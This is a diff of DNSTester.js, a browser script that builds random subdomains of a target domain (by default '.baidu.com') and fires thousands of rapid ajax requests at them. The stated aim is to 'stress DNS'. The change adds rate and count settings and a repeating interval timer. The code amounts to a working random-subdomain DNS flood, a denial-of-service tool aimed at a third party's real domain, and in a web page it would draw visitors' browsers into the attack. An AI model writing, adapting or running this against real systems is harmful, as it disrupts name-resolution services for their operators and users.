@@ -1,5 +1,5 @@
 /*!
- * DNSTester.js 0.0.3
+ * DNSTester.js 0.0.35
  * https://github.com/cnbeining/DNSTester.js
  * http://www.cnbeining.com/
  *
@@ -11,10 +11,12 @@
  * https://github.com/cnbeining/DNSTester.js/blob/master/LICENSE
  *
  */
-document.write("<script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'>\x3c/script>");
-!window.jQuery && document.write("<script src='https://code.jquery.com/jquery-latest.js'>\x3c/script>"); //In casse HTTPS
 var COUNT = 0;
 var STARTTIME = (new Date).getTime();
+var DOMAIN = ".baidu.com/"; //Change me in caller
+var MAX_COUNT = 50000;  //Change me in caller
+var TPS = 100;  //Change me in caller
+var TIMERID = 0; //To stop the test
 function makeid_old(length)
 {
     var text = "";
@@ -42,7 +44,7 @@ function r_send2() {
     if ((MAX_COUNT < 1 || COUNT >= MAX_COUNT) != true) {
           get("https://" + makeid(Math.floor((Math.random() * 64) + 1)) + DOMAIN) // NEVER FORGET, in case you use HTTPS
       };
-      if (COUNT % 1000 == 0) { //report every 1000 times
+    if (COUNT % 1000 == 0) { //report every 1000 times
           console.log('Done: ' + COUNT.toString())
       };
 }
@@ -51,19 +53,16 @@ function get(a) {
     $.ajax({
         url: a,
         dataType: "script",
-        timeout: 1E-4, //So fail immediately, but good enough to stress DNS
+        timeout: 1E-2, //So fail immediately, but good enough to stress DNS
         cache: !0,
         // beforeSend: function() {
         // requestTime = (new Date).getTime()
         // },
         complete: function() {
             COUNT += 1;
-            r_send2();
         }
         })
 }
 function r_send(a) {
-    setTimeout("r_send2()", a)
+    TIMERID = setInterval("r_send2()", a)
 }
-//var DOMAIN = ".baidu.com/" // Change me!
-//setTimeout("r_send2()", 1E-2); // Change speed here!
